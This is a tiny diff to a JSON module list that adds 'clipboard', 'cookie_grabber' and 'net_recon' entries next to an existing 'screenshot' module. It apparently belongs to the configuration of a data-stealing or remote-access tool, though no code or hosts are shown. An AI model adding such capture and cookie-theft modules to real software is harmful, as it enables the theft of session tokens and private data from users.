@@ -4,5 +4,15 @@
   },
   {
     "module": "screenshot"
+  },
+  {
+    "module": "clipboard"
+  },
+  {
+    "module": "cookie_grabber"
+  },
+  {
+    "module": "net_recon"
   }
 ]
+
